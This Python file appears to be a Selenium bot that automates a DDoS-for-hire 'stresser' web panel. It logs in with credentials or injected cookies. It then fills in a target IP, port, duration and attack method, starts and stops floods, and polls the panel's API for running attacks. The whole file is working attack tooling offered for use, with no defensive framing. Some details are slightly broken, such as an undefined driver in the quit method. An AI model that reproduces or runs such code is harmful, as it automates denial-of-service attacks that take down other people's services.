from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.common.exceptions import *

import os
import logging
import requests
import time

from utils.pages import Pages

class Bot(Pages):
    def __init__(self, driver: webdriver.Chrome, info: dict) -> None:
        self.driver = driver
        self.info = info
        self.driver.get("https://www.stressthem.se")
        self.driver.implicitly_wait(0.5)

    def find_element_by_locator(self, locator) -> WebDriverWait:
        return WebDriverWait(self.driver, 10).until(EC.presence_of_element_located(locator))

    def get_cookies(self) -> dict:
        cookies = self.driver.get_cookies()
        return {cookie['name']: cookie['value'] for cookie in cookies}

    def restart_session(self):
        self.driver.execute_script("location.reload();")

    def close_button(self):
        self.close_button= self.driver.find_element(By.CLASS_NAME, "close")
        self.close_button.click()

    def login_form(self) -> any:
        self.login_page()

        username_form = self.driver.find_element(By.ID, "username")
        username_form.send_keys(self.info["username"])

        password_form = self.driver.find_element(By.ID, "password")
        password_form.send_keys(self.info["password"])

        self.driver.implicitly_wait(0.5)
        self.driver.find_element(By.CLASS_NAME, "btn").click()

    def login_cookies(self) -> any:
        for cookie in self.info["cookies"]:
            self.driver.add_cookie(cookie)

    def start_attack(self, ip: str, port: int, time: int, method: str):
        self.ip_form = self.driver.find_element(By.ID, "host")
        self.ip_form.send_keys(ip)

        self.port_form = self.driver.find_element(By.ID, "port")
        self.port_form.send_keys(port)

        self.time_form = self.driver.find_element(By.ID, "time")
        self.time_form.send_keys(time)

        self.method_form = Select(self.driver.find_element(By.ID, "method"))
        self.method_form.select_by_value(method)

        self.driver.implicitly_wait(1.0)

        self.driver.execute_script("startAttack();")
        self.driver.implicitly_wait(1.0)

        try:
            self.restart_session()
        except:
            pass

    def get_running_attacks(self, cookies: dict):
        s = requests.session()

        headers = {
            'User-Agent': self.info["userAgent"],
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.stressthem.se/hub',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.stressthem.se',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Content-Length': '0',
            'TE': 'trailers'
        }

        response = s.post(
            url="https://www.stressthem.se/request/hub/running/attacks",
            headers=headers,
            cookies=cookies
        )
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error en la solicitud. Código de estado: {response.status_code}")

    def stop_attack(self, id: any):
        self.driver.execute_script("stopAttack();", id)
        time.sleep(0.2)

    def driver_quit(self) -> any:
        driver.quit()